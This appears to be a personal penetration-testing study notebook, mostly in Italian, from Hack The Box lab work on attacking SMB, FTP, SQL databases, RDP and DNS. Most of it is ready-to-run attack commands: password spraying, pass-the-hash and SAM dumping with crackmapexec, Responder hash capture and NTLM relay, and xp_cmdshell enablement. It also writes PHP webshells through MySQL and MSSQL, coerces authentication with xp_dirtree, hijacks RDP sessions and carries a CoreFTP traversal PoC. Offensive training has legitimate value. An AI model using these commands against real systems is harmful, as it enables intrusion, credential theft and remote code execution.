# Interacting with Common Services

## File Sharing services

## Various ways to interact with SMB

### Win + R \\IP\sharename
Un modo semplice e' premere \\IP\nomeshare e ci aprira' la finestra nella share

### dir \\IP\sharename
da CMD shell possiamo lanciare `C:\htb> dir \\192.168.220.129\Finance\` per listare i contenuti della share

### WIndows CMD net
`C:\htb> net use n: \\192.168.220.129\Finance` per usare la share 

`C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123` se chiede l' autenticazione

`C:\htb> dir n: /a-d /s /b | find /c ":\"` Per contare quanti file nella share

`C:\htb>dir n:\*cred* /s /b` per vedere se ci sono file che contengono 'cred' nel nome del file

### Con findstr
`c:\htb>findstr /s /i cred n:\*.*` cerca file che contengono 'cred' dentro di loro


### Con Powershell

`PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\` lista i contenuti della share

`PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"` invece che net use

### Se richiede credenziali
```
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```
### vedere quanti file ci sono nella share montata N
```
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count

29302
```

### Vedere file con 'cred' nel nome
`PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File`

### File che contengono cred dentro
`PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List`

## Montare share su Linux
```
j4k1dibe@htb[/htb]$ sudo mkdir /mnt/Finance
j4k1dibe@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

`sudo apt install cifs-utils` per installare le dipendenze per collegarsi alla share smb

`j4k1dibe@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile` alternativa

### Linux find
`j4k1dibe@htb[/htb]$ find /mnt/Finance/ -name *cred*` find files that contains 'cred' in the name

`j4k1dibe@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred` files that contains 'cred' inside

## Other Services

Spesso dovremo interagire con diversi servizi. 

`j4k1dibe@htb[/htb]$ sudo apt-get install evolution`  per installare evolution, un mail client su linux

## Databases

Abbiamo vari modi per comunicare con i database. 

1) Usare command line utilities come **mysql** o **sqsh** shells
2) Usare le GUI per questi prodotti
3) usare linguaggi di programmazione

### MSSQL

Per interagire con MSSQL usiamo **sqsh** oppure **sqlcmd**

`j4k1dibe@htb[/htb]$ sqsh -S 10.129.20.13 -U username -P Password123` da linux

`C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123` da windows

### MySQL
`j4k1dibe@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13` da linux

`C:\htb> mysql.exe -u username -pPassword123 -h 10.129.20.13` da windows

### GUI

per usare le GUI dobbiamo installare 

`j4k1dibe@htb[/htb]$ sudo dpkg -i dbeaver-<version>.deb`


# Attacking FTP

## Enumeration
`j4k1dibe@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 `

## Misconfigurations

1) Controlliamo se possiamo fare anonymous login


## Brute force con Medusa

`j4k1dibe@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp `

## FTP Bounce attack

Un attacco FTP Bounce permette ad un attaccante di utilizzare un server FTP esposto all' esterno per interagire con la rete interna usando il comando **PORT**.

`nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2` 

Con questo comando possiamo fare una nmap scan di una macchina in rete interna.

## Latest FTP VUlnerabilities


### CoreFTP before build 727 CVE-2022-22836

E' una vuln che ci permette (da autenticati) di fare ath traversal e fare arbitrary file write (quindi se c'e' tipo un server web possiamo caricare una web shell)

### Exploitation
`j4k1dibe@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`

# Attacking SMB

SMB Gira in porta 139 TCP e porta 137 e 138 UDP.

Inizialmente ra fatto per girare sopra NetBIOS in TCP , ma dopo Microsoft ha agigunto opzione di runnarlo diretto su porta 445 senza il layer di NetBIOS.
Comunque anche i sistemi moderni supportano SMB over NetBIOS come implementazione di resilienza.

Altro protoccoli correlato a SMB e' MSRPC, RPC da ai developer un metodo per eseguire procedure remoto in locale o remoto senza dover capire i protocolli di rete.

## Enumeration
`j4k1dibe@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445`

## Misconfigurations
SMB puo' essere configurata per non richiedere autenticazione. TIpicamente e' detta **null session**. 

### Anonymous authentication
Se troviamo un server SMB che non ha bisogno di credenziali possiamo avere una lista di share, username, gruppi, permessi etc.etc.

Per farlo usiamo tool come **smbclient, smbmap, rpcclient, or enum4linux**.

### Enumero File Share con smbclient
`j4k1dibe@htb[/htb]$ smbclient -N -L //10.129.14.128`, **-L** signific lista le share. **-N** significa usa la null session.

### Enumero file share con smbmap
`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128`

`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128 -r notes` con la flag **-r** (recursive) posso ispezionare una share e i permessi

`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"` con la flag **--download** scarico un file da una share

`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` con la flag **--upload** carico un file in una share.

## RPC

Possiamo usare rpcclient con una null session per enumerare workstation o domain controller

il tool **rpcclient** ci offre molti comandi per eseguire funzioni specifiche su server SMB. (extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Fwww.willhackforsushi.com%2Fsec504%2FSMB-Access-from-Linux.pdf CHEAT SHEET)

```
j4k1dibe@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

### Enum4linux
E; un altro tool che utilizza altri tool per automatizzare enumerazione di target SMB

`j4k1dibe@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C`

## Protocol Specific attacks

Se non e' abilitato una null session dobbiamo avere le credenziali. possiamo provare **brute forcing** e **Password Spray**.


### Password spray con crackmapexec
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`, se si vuole trovare altri login dopo averne trovato uno bisogna usare la flag **--continue-on-success**

## RCE

Se riusciamo ad avere delle credenziali possiamo riuscire a prendere una RCE tramite **PsExec**

`j4k1dibe@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17` RCE com Impacket-psexec

`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` rce con crackmapexec


## Enumerating logged-on users
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`

## Extract hashes from SAM database
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`

## Pass-The-Hash

Se riusciamo a prendere un hash NTLM di un utente e non riusciamo a craccarlo possiamo autenticarci su SMB tramite Pass-The-Hash.

`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`

## Forced Authentication Attacks

Possiamo abusare di SMB creando un falso erver SMB per catturare le **NetNTLM v1/v2 hash**

Per farlo dovremo usare il tool **Responder** e dovremo aspettare delle richieste al DNS locale.

`j4k1dibe@htb[/htb]$ responder -I <interface name>`

tutti gli hash intercettati stanno nella log directory: `/usr/share/responder/logs/`

Per crackare gli hash:

`j4k1dibe@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`



The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.

First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).

```
j4k1dibe@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```
Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.

`j4k1dibe@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`

# Latest SMB Vulnerabilities

Una vuln recente su SMB e' **SMBGhost ** 


# Attacking SQL Databases

MySQL e MSSQL sono database relazionali.

Host di database sono target perche' hanno dati sensibili.

## Enumeration
### Banner Grabbing
`j4k1dibe@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125`

## Authentication mechanisms
**MSSQL** supporta due modi di autentiazione: **WIndows Authentication** , molto integrata in Active Directorye **Mixed Mode**.
MySQL supporta username|password,

CVE-2012-2122 in MySQL 5.6.x ci faceva bypassare autenticazione usando la stessa password sbagliata


### Connecting to SQL Server
`j4k1dibe@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13` linux
`j4k1dibe@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`  Linux
`j4k1dibe@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` Using **Windows Authentication**.

`j4k1dibe@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 ` Linux, MSSQL

`C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30` Windows

## Execute Commands
A volte si possono eseguire comandi tramite il DB.

in **MSSQL** c'e' **xp_cmdshell** che ci permette di avere una command-shell, comunque e' disabilitata di default.

`1> xp_cmdshell 'whoami'`

Se abbiamo i giusti privilegi possiamo abilitarla: 

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

Ci sono altri modi per ottenere code execution, ad esempio MySQL supporta User Defined Functions, che permette a codice C/C++ di eseguire come funzione in SQL.

## Write Local Files

### Mysql
MySQL non ha stored procedure come xp_cmdshell pero' possiamo scrivere file nel sistema

`mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';` Esempio di caricare una webshell in unaa directory

Questa operazione e' permessa solo se abbiamo i permessi di fare cio', si vede dalla variabile globale **secure_file_priv**

`mysql> show variables like "secure_file_priv";`, se e' vuota possiamo leggere e scrivere.


### MSSQL

### Enable OLE Automation process
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### MSSQL Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```


## Read Local FIles

### Read local files in MSSQL

```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### Read Local FIles in MySQL
`mysql> select LOAD_FILE("/etc/passwd");`

## Capture MSSQL Service Hash

Possiamo rubare hash del servizio MSSQL usando **xp_subdirs** o **xp_dirtree**, sono stored procedure non documentate che usano SMB per retrievare una lista di child directory sotto una parent directory. Se facciamo puntare al server SMB la directory listing func forzera' il server ad autenticare e mandare l' HASH del servizio

### Con XP_DIRTREE
```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

### Con XP_SUBDIRS
```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### In ascolto, XP_SUBDIRS
`j4k1dibe@htb[/htb]$ sudo responder -I tun0` con responder

`j4k1dibe@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support` con Impacket

## Impersonate Existing Users with MSSQL

Il server SQL ha il permesso speciale IMPERSONATE. che permette all' utente di avere permessi di un altro utente.

Prima pero' dobbiamo capire chi possiamo impersonare

```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin
```

### Verifying our current role
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio   0      
```
0 significa che non abbiamo sysadmin rule

Pero' possiamo impersonare ad esempio l' utente SA (che e' sysadmin)

```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1
```


## Communicaiing with Other Databases with MSSQL

MSSQL ha un opzione detta **linked servers**. sono tipicamente configurati per abilitare il database engine ad eseguire una Transact-SQL statement che include altre tabelle.

praticamente possiamo muoverci lateralmente verso altri SQL server se c'e' questa cnfigurazione

### Identifying linked server

```
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0
```

vediamo che il primo e' remoto., invece il secondo c'e' 0 quindi e' un Linked Server

Possiamo usare lo statement **EXECUTE** per eseguire comandi sul linked server

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

```

# Attacking RDP

### Enum
`j4k1dibe@htb[/htb]# nmap -Pn -p3389 192.168.2.143 `

## Misconfiguration

Un metodo semplice **Password guessing**., a volte potremmo pure trovare un RDP senza password

Usando **crowbar (https://github.com/galkan/crowbar)** possiamo fare password spraying su RDP

### PAssword spray con crowbar
`j4k1dibe@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`

### Password spray con Hydra
`j4k1dibe@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

### RDP Login
`j4k1dibe@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143`

`xfreerdp /v:host /u:username`

## Protocol specific attacks
## RDP Session Hijacking

Se un utente e' connesso via RDP ad una macchina compromessa da noi possiamo hijackare la sessione dell' utente per scalare privilegi e impersonare l'account.

Per impersonare un utente senza la loro password dovremo avere privilegi SYSTEM e usare **tscon.exe** per abilitare utenti a connettersi ad una altra sessione di Desktop.

`C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`

Se siamo local admin ci sono molti modi per escalare tpo con con PsExec o Mimikatz. Un trucco semplice e' creare un servizio che runna come local system

```
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

cosi' spawna un nuovo terminale


### RDP Pass the hash
Possiamo voler avere accesso ad applicazioni o software installati che si possono usare solo con GUI.

**Restriced Admin Mode**. che e' disabilitata da default dovremmo abilitarla senno' ci da' un errore in login ovvero che non gli abbiamo dato password perche' noi passiamo hash, non password. Per disabilitarla bastera' aggiungere una Reg key.

`C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

`j4k1dibe@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9` Login with Pass the Hash.

## Latest RDP Vulns

CVE-2019-0708, BlueKeep e' una vuln che da RCE


# Attacking DNS
DNS gira principalmente in porta 53 sia TCP che UDP.

### Enumeration
`j4k1dibe@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213`

## DNS Zone Transfer
Dato che il DNS comprende piu' DNS ZOne, il server DNS utilizza la DNS Zone transfer per copiare una porzione del database di queste zone ad un altro server DNS.

Se il DNS e' configurato male(Nessun whitelisting di IP) chiunque puo' fare una DNS Zone transfer dato che non richiede autenticazione.


### Usare dig con AXFR per dumpare tutti i DNS namesaces
`j4k1dibe@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`


### Usare Fierce per enumerare tutti i server DNS del root domain e fare una scan per zone transfer

`j4k1dibe@htb[/htb]# fierce --domain zonetransfer.me`

## Domain takeover & Subdomain Enumeration
il **Domain takeover** significa registrare un domain name non esistente per ottenere controllo su un altro dominio. Ad esempio si puo' fare quando un dominio e' scaduto.

Il domain takeover si puo' pure fare facendo un **subdomain takeover**.

un DNS Canonical Name (**CNAME**) record e' usato per mappare diversi domini ad un parent domain(Quindi puntano tutti allo stesso dominio).


## Subdomain enumeration
(https://github.com/projectdiscovery/subfinder)

### con Subfinder
`j4k1dibe@htb[/htb]# ./subfinder -d inlanefreight.com -v `

### con Subbrute
```
j4k1dibe@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
j4k1dibe@htb[/htb]$ cd subbrute
j4k1dibe@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
j4k1dibe@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

## Enumerare il CNAME per alcuni sottodomini
`j4k1dibe@htb[/htb]# host support.inlanefreight.com`

vediamo cosi' gli alias. `support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com`


## Takeover
https://github.com/EdOverflow/can-i-take-over-xyz, repo per fare attacchi di subdomain takeover

## DNS Spoofing
Detto anche DNS Cache Poisoning, consiste nell' alterare i DNS record con informazioni false per redirectare il traffico a siti fraudolenti.

Si puo' fare con attacchi MiTM andando a spoofare le query.

Exploitare una vulnerabilita' trovata in un server DNS


## Local DNS Cache Poisoning
COn tool tipo Ettercap o bettercap e' possibile spoofare DNS cache in locale

Prima cosa modifichiamo 
`j4k1dibe@htb[/htb]# cat /etc/ettercap/etter.dns` per mappare dominio all'attaccante

con ettercap
Bho poi facciamo **Hosts > Scan For Hosts > Plugins > Manage Plugins > dns_spoof**
